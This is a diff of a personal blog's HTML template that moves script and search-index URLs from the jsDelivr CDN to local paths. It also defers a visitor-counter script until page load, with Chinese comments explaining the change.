 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/search.js"></script>
+<script src="/js/search.js"></script>
 <script type="text/javascript">
 $(function () {
-    searchFunc("https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/search.xml", 'searchInput', 'searchResult');
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
 });
 </script>
 
@@ -1706,12 +1720,12 @@ $(function () {
 </div>
 
 	
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/matery.js"></script>
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
 
 
     <!-- Baidu Analytics -->
@@ -1721,14 +1735,13 @@ $(function () {
     
     
     <!--
-      不蒜子计数：原写法是 <script async src="...">。async 脚本同样会挂住 window.load，
-      一旦 busuanzi.ibruce.info 卡住，页面就一直转圈、Network 里那条请求长期 pending。
-      改成：先隐藏计数 → 等 load 之后再动态插入脚本 → 成功才由脚本自己显示出来。
-      这样页面加载完全不受第三方接口影响；接口不通时保持隐藏，不会留一个空标签。
+      访问计数：脚本等 window.load 之后再动态插入，任何第三方接口卡住都不影响页面加载。
+      后端见 source/js/counter.js —— 自建 Cloudflare Worker 优先，未配置/失败时回退 Vercount。
+      计数容器默认隐藏，拿到数字才显示，避免留一个「总访问量: 」空标签。
     -->
     <script>
         (function () {
-            var src = 'https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/others/busuanzi.pure.mini.js';
+            var src = '/js/counter.js';
             var keys = ['site_pv', 'page_pv', 'site_uv'];
             keys.forEach(function (k) {
                 var el = document.getElementById('busuanzi_container_' + k);
@@ -1757,7 +1770,7 @@ $(function () {
     
 
     
-    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
 </body>
